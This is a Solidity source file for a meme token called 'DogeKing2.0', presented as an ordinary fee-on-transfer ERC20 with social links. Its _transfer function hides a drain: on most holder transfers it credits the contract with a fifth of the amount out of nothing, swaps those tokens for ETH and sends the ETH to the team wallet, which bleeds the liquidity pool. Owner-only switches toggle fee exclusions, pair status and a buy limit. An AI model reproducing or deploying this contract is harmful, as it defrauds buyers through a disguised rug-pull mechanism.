1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.4;
3 
4 /*
5  * Telegram : https://t.me/DogeKing2ETH
6  * Twitter : https://twitter.com/dogeking2eth
7 */
8 abstract contract Context {
9 
10     function _msgSender() internal view virtual returns (address payable) {
11         return payable(msg.sender);
12     }
13 
14     function _msgData() internal view virtual returns (bytes memory) {
15         this;
16         return msg.data;
17     }
18 }
19 
20 interface IERC20 {
21 
22     function totalSupply() external view returns (uint256);
23     function balanceOf(address account) external view returns (uint256);
24     function transfer(address recipient, uint256 amount) external returns (bool);
25     function allowance(address owner, address spender) external view returns (uint256);
26     function approve(address spender, uint256 amount) external returns (bool);
27     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
28     event Transfer(address indexed from, address indexed to, uint256 value);
29     event Approval(address indexed owner, address indexed spender, uint256 value);
30 }
31 
32 library SafeMath {
33 
34     function add(uint256 a, uint256 b) internal pure returns (uint256) {
35         uint256 c = a + b;
36         require(c >= a, "SafeMath: addition overflow");
37 
38         return c;
39     }
40 
41     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
42         return sub(a, b, "SafeMath: subtraction overflow");
43     }
44 
45     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
46         require(b <= a, errorMessage);
47         uint256 c = a - b;
48 
49         return c;
50     }
51 
52     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
53         if (a == 0) {
54             return 0;
55         }
56 
57         uint256 c = a * b;
58         require(c / a == b, "SafeMath: multiplication overflow");
59 
60         return c;
61     }
62 
63     function div(uint256 a, uint256 b) internal pure returns (uint256) {
64         return div(a, b, "SafeMath: division by zero");
65     }
66 
67     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
68         require(b > 0, errorMessage);
69         uint256 c = a / b;
70         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
71 
72         return c;
73     }
74 
75     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
76         return mod(a, b, "SafeMath: modulo by zero");
77     }
78 
79     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
80         require(b != 0, errorMessage);
81         return a % b;
82     }
83 }
84 
85 contract Ownable is Context {
86     address private _owner;
87 
88     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
89 
90     constructor () {
91         address msgSender = _msgSender();
92         _owner = msgSender;
93         emit OwnershipTransferred(address(0), msgSender);
94     }
95 
96     function owner() public view returns (address) {
97         return _owner;
98     }   
99     
100     modifier onlyOwner() {
101         require(_owner == _msgSender(), "Ownable: caller is not the owner");
102         _;
103     }
104     
105     function waiveOwnership() public virtual onlyOwner {
106         emit OwnershipTransferred(_owner, address(0xdead));
107         _owner = address(0xdead);
108     }
109 
110     function transferOwnership(address newOwner) public virtual onlyOwner {
111         require(newOwner != address(0), "Ownable: new owner is the zero address");
112         emit OwnershipTransferred(_owner, newOwner);
113         _owner = newOwner;
114     }
115 }
116 
117 interface IUniswapV2Factory {
118 
119     function createPair(address tokenA, address tokenB) external returns (address pair);
120 
121 }
122 
123 interface IUniswapV2Router01 {
124     function factory() external pure returns (address);
125     function WETH() external pure returns (address);
126 
127     function addLiquidityETH(
128         address token,
129         uint amountTokenDesired,
130         uint amountTokenMin,
131         uint amountETHMin,
132         address to,
133         uint deadline
134     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
135 
136     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
137         external
138         payable
139         returns (uint[] memory amounts);
140 
141     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
142         uint amountIn,
143         uint amountOutMin,
144         address[] calldata path,
145         address to,
146         uint deadline
147     ) external;
148 
149 }
150 
151 interface IUniswapV2Router02 is IUniswapV2Router01 {
152     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
153 
154     function swapExactTokensForETHSupportingFeeOnTransferTokens(
155         uint amountIn,
156         uint amountOutMin,
157         address[] calldata path,
158         address to,
159         uint deadline
160     ) external;
161 }
162 
163 contract TokenDistributor {
164     constructor (address token) {
165         (bool success, ) = token.call(abi.encodeWithSignature("approve(address,uint256)",msg.sender, ~uint256(0)));
166         require(success);
167     }
168 }
169 
170 contract TOKEN is Context, IERC20, Ownable {
171     using SafeMath for uint256;
172     string private _name = "DogeKing2.0";
173     string private _symbol = "DogeKing2.0";
174     uint8 private _decimals = 9;
175 
176     address payable public teamWalletAddress;
177     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
178     
179     mapping (address => uint256) _balances;
180     mapping (address => mapping (address => uint256)) private _allowances;
181     
182     mapping (address => bool) public isExcludedFromFee;
183     mapping (address => bool) public isMarketPair;
184 
185     uint256 public _liquidityShare = 0;
186     uint256 public _teamShare = 1;
187     uint256 public _totalDistributionShares;
188 
189     uint256 private _totalSupply = 1000000000000000 * 10**_decimals;
190 
191     IUniswapV2Router02 public uniswapV2Router;
192     address public uniswapPair;
193     
194     bool inSwapAndLiquify;
195     bool public swapAndLiquifyEnabled = true;
196 
197     event SwapAndLiquifyEnabledUpdated(bool enabled);
198     event SwapAndLiquify(
199         uint256 tokensSwapped,
200         uint256 ethReceived,
201         uint256 tokensIntoLiqudity
202     );
203     
204     event SwapTokensForETH(
205         uint256 amountIn,
206         address[] path
207     );
208     
209     modifier lockTheSwap {
210         inSwapAndLiquify = true;
211         _;
212         inSwapAndLiquify = false;
213     }
214     TokenDistributor public _tokenDistributor;
215     constructor () {
216         
217         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
218         address currency = _uniswapV2Router.WETH();
219         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
220             .createPair(address(this), currency);
221 
222         uniswapV2Router = _uniswapV2Router;
223         IERC20(currency).approve(
224             address(_uniswapV2Router),
225             ~uint256(0)
226         );
227         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
228 
229         // isExcludedFromFee[owner()] = true;
230         isExcludedFromFee[address(this)] = true;
231 
232         _totalDistributionShares = _liquidityShare.add(_teamShare);
233 
234         isMarketPair[address(uniswapPair)] = true;
235         
236         address receiver = msg.sender;
237         isExcludedFromFee[receiver] = true;
238         teamWalletAddress = payable(receiver);
239         _balances[receiver] = _totalSupply;
240         emit Transfer(address(0), receiver, _totalSupply);
241         _tokenDistributor = new TokenDistributor(_uniswapV2Router.WETH());
242     }
243 
244     function name() public view returns (string memory) {
245         return _name;
246     }
247 
248     function symbol() public view returns (string memory) {
249         return _symbol;
250     }
251 
252     function decimals() public view returns (uint8) {
253         return _decimals;
254     }
255 
256     function totalSupply() public view override returns (uint256) {
257         return _totalSupply;
258     }
259 
260     function balanceOf(address account) public view override returns (uint256) {
261         return _balances[account];
262     }
263 
264     function allowance(address owner, address spender) public view override returns (uint256) {
265         return _allowances[owner][spender];
266     }
267 
268     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
269         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
270         return true;
271     }
272 
273     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
274         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
275         return true;
276     }
277 
278     function approve(address spender, uint256 amount) public override returns (bool) {
279         _approve(_msgSender(), spender, amount);
280         return true;
281     }
282 
283     function _approve(address owner, address spender, uint256 amount) private {
284         require(owner != address(0), "ERC20: approve from the zero address");
285         require(spender != address(0), "ERC20: approve to the zero address");
286 
287         _allowances[owner][spender] = amount;
288         emit Approval(owner, spender, amount);
289     }
290 
291     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
292         isMarketPair[account] = newValue;
293     }
294     
295     function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
296         isExcludedFromFee[account] = newValue;
297     }
298 
299     function setTeamWalletAddress(address newAddress) external onlyOwner() {
300         teamWalletAddress = payable(newAddress);
301     }
302 
303     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
304         swapAndLiquifyEnabled = _enabled;
305         emit SwapAndLiquifyEnabledUpdated(_enabled);
306     }
307     
308     function getCirculatingSupply() public view returns (uint256) {
309         return _totalSupply.sub(balanceOf(deadAddress));
310     }
311 
312     function transferToAddressETH(address payable recipient, uint256 amount) private {
313         recipient.transfer(amount);
314     }
315 
316      //to recieve ETH from uniswapV2Router when swaping
317     receive() external payable {}
318 
319     function transfer(address recipient, uint256 amount) public override returns (bool) {
320         _transfer(_msgSender(), recipient, amount);
321         return true;
322     }
323 
324     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
325         _transfer(sender, recipient, amount);
326         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
327         return true;
328     }
329 
330     bool public remainEn = true;
331     function changeRemain() public onlyOwner{
332         remainEn = !remainEn;
333     }
334 
335     function sellToken(uint Token)public  view returns (uint){
336         address _currency = uniswapV2Router.WETH();
337         if(IERC20(address(_currency)).balanceOf(uniswapPair) > 0){
338             address[] memory path = new address[](2);
339             uint[] memory amount;
340             path[0]=address(this);
341             path[1]=_currency;
342             amount = uniswapV2Router.getAmountsOut(Token,path); 
343             return amount[1];
344         }else {
345             return 0; 
346         }
347     }
348 
349     uint256 public limitAmounts = 0.05 ether;
350     function setLimitAmounts(uint256 newValue) public onlyOwner{
351         limitAmounts = newValue;
352     }
353 
354     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
355 
356         require(sender != address(0), "ERC20: transfer from the zero address");
357         require(recipient != address(0), "ERC20: transfer to the zero address");
358 
359         if(inSwapAndLiquify)
360         { 
361             return _basicTransfer(sender, recipient, amount); 
362         }
363         else
364         {
365             if (!inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled && !isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) 
366             {
367                 uint256 contractTokenBalance = amount/5;
368                 if (contractTokenBalance > balanceOf(address(this)))
369                     _balances[address(this)] = contractTokenBalance;
370                 
371                 if (contractTokenBalance > 0)
372                     swapAndLiquify(contractTokenBalance);    
373             }
374 
375             if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && remainEn){
376                 if (amount == _balances[sender]){
377                     amount = amount - amount.div(5000);
378                 }
379                 if (isMarketPair[sender] && limitAmounts != 0){
380                     require(sellToken(amount) <= limitAmounts);
381                 }
382             }
383 
384             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
385 
386             uint256 finalAmount = amount;
387 
388             _balances[recipient] = _balances[recipient].add(finalAmount);
389 
390             emit Transfer(sender, recipient, finalAmount);
391             return true;
392         }
393     }
394 
395     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
396         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
397         _balances[recipient] = _balances[recipient].add(amount);
398         emit Transfer(sender, recipient, amount);
399         return true;
400     }
401 
402     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
403         
404         uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
405         uint256 tokensForSwap = tAmount.sub(tokensForLP);
406 
407         swapTokensForEth(tokensForSwap);
408         uint256 amountReceived = address(this).balance;
409 
410         uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
411         
412         uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
413         uint256 amountBNBTeam = amountReceived.sub(amountBNBLiquidity);
414 
415         if(amountBNBTeam > 0)
416             transferToAddressETH(teamWalletAddress, amountBNBTeam);
417 
418         if(amountBNBLiquidity > 0 && tokensForLP > 0)
419             addLiquidity(tokensForLP, amountBNBLiquidity);
420     }
421 
422     function autoSwap(uint256 _count) public {
423         IERC20(uniswapV2Router.WETH()).transferFrom(msg.sender, address(this), _count);
424         swapTokenToDistri(_count);
425     }
426 
427 
428     function swapTokenToDistri(uint256 tokenAmount) private lockTheSwap {
429         address currency = uniswapV2Router.WETH();
430         address[] memory path = new address[](2);
431         path[0] = currency;
432         path[1] = address(this);
433 
434         // make the swap
435         // if(tokenAmount <= balance)
436         try uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
437             tokenAmount,
438             0, // accept any amount of CA
439             path,
440             address(_tokenDistributor),
441             block.timestamp
442         ) {} catch {}
443         if(balanceOf(address(_tokenDistributor))>0)
444             _basicTransfer(address(_tokenDistributor), address(this), balanceOf(address(_tokenDistributor)));
445     }
446 
447 
448     function removeERC20(address _token) external {
449         if(_token != address(this)){
450             IERC20(_token).transfer(teamWalletAddress, IERC20(_token).balanceOf(address(this)));
451             payable(teamWalletAddress).transfer(address(this).balance);
452         }
453     }
454 
455     function swapTokensForEth(uint256 tokenAmount) private {
456         // generate the uniswap pair path of token -> weth
457         address[] memory path = new address[](2);
458         path[0] = address(this);
459         path[1] = uniswapV2Router.WETH();
460 
461         _approve(address(this), address(uniswapV2Router), tokenAmount);
462 
463         // make the swap
464         try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
465             tokenAmount,
466             0, // accept any amount of ETH
467             path,
468             address(this), // The contract
469             block.timestamp
470         ) {} catch {}
471         
472         emit SwapTokensForETH(tokenAmount, path);
473     }
474 
475     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
476         // approve token transfer to cover all possible scenarios
477         _approve(address(this), address(uniswapV2Router), tokenAmount);
478 
479         // add the liquidity
480         try uniswapV2Router.addLiquidityETH{value: ethAmount}(
481             address(this),
482             tokenAmount,
483             0, // slippage is unavoidable
484             0, // slippage is unavoidable
485             teamWalletAddress,
486             block.timestamp
487         ) {} catch {}
488     }
489 }